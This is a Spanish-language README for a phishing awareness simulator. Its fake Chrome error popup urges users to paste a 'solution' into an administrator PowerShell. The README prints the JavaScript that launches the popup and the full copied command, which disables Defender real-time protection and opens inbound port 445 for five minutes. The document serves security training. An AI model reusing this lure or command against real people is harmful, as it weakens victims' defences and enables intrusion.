
# 🎣 Simulador de Phishing - Concientización en Ciberseguridad

Este proyecto es una **simulación de ataque phishing** desarrollada con fines **educativos y de concientización**, pensada para demostrar cómo funcionan ciertas técnicas engañosas utilizadas por atacantes reales. El archivo principal es `popup.html`, el cual simula un mensaje emergente falso con una apariencia legítima y botones que inducen al usuario a ejecutar comandos maliciosos.

---

## ⚠️ IMPORTANTE

> **Este proyecto es únicamente para uso educativo, en entornos controlados y con consentimiento informado.**  
> ❌ No debe ser utilizado con fines maliciosos ni en sistemas de terceros sin autorización expresa.

---

## 📝 Descripción del proyecto

El archivo `popup.html` muestra una ventana emergente que simula un error en el navegador Chrome. La interfaz guía al usuario a "copiar una solución" para luego pegarla en PowerShell como administrador, lo cual replica un ataque real de ingeniería social.

📦 Puede ser invocado desde otra web con este código:

```javascript
window.open("popup.html", "popupWindow", "width=600,height=400,resizable=no,scrollbars=no");
```

### 🔧 Funciones simuladas

- 🖼️ Imitación visual de un mensaje de error oficial.
- 📋 Botón de “Copiar solución” que copia un comando PowerShell.
- ❌ Botón para cerrar manualmente el popup.
- 🎨 Animaciones suaves y diseño similar al de Google Chrome.

---

## 🎯 Objetivo

El objetivo principal es educar sobre:

- 🧠 Cómo los atacantes engañan visualmente a los usuarios.
- 🛠️ Qué tipo de comandos pueden ocultar detrás de mensajes aparentemente confiables.
- 🔐 La importancia de **no ejecutar comandos sin verificar su procedencia**.

---

## 🧪 Comando simulado

Este es el comando que se copia al portapapeles:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true; netsh advfirewall firewall add rule name="Puerto_445_TCP" dir=in action=allow protocol=TCP localport=445; Start-Sleep -Seconds 300; Set-MpPreference -DisableRealtimeMonitoring $false; netsh advfirewall firewall delete rule name="Puerto_445_TCP"
```

☠️ Este tipo de comando desactiva temporalmente el antivirus y abre puertos del firewall: algo **altamente peligroso en escenarios reales**.

---

## 🧑‍🏫 Uso recomendado

Utilizá este simulador en:

- 🧪 Laboratorios de ciberseguridad.
- 🧑‍💻 Capacitaciones y charlas educativas.
- 🧠 Ejercicios de ingeniería social simulada.
- 🔍 Auditorías internas con propósito de concientización.

---

## 🗂️ Archivos

- `popup.html`: ventana emergente con el mensaje falso y botones interactivos.
- Código externo JS: para abrir el popup desde otra web.

---

## 👤 Autor

**Sebastián Peinador**  
👨‍🏫 Docente y especialista en Ciberseguridad  
🏥 Ministerio de Salud - Hospital José M. Penna (CABA)  
📚 CFP36 - Ministerio de Educación (CABA)

---

## 📢 Contribuciones

Se aceptan pull requests que amplíen el material con nuevas simulaciones u opciones visuales.  
💡 ¡Todo aporte educativo es bienvenido!

---

## 🛑 Disclaimer legal

Este proyecto fue creado exclusivamente con fines educativos.  
**⚖️ No nos responsabilizamos por el mal uso del código ni por las consecuencias legales o técnicas derivadas de su uso inapropiado.**
